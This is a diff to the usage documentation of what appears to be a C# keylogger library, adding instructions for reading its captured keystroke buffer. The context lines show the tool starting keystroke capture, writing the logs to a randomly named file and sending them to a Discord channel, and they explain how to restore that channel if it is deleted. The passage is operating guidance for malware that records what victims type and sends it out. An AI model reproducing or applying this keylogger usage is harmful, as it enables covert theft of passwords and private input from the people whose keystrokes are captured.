@@ -270,6 +270,10 @@ logger.ParentID = 0; //Parent ID is basically the Category ID
 
 logger.StartKeyLogger(true, 5, "-", true); //First Parameter: WriteToFile (Its required to send logs to discord), Second Parameter: MaxBufferLength, Third Parameter: The file Name, use "-" to generate a random File name, Fourth Parameter: SendToDiscordChannel
 ```
+> Other Property
+```CSharp
+string buf = logger.Buffer; //logger.Buffer contains the Buffer, Don't call this in a while (true) loop, it will be bugged. Use Thread.Sleep() to call it in a loop, because the buffer gets written from a loop aswell, if you try to access the Property from a loop you will basically get the buffer multiplied by a few hundred of times.
+```
 > Known Bug with channel
 ```CSharp
 logger.ClearSavedChannelID(); //If you delete the channel in your server, the Program wont be able to send any Logs, with this function you delete the saved channelID and it creates a new one for writing.
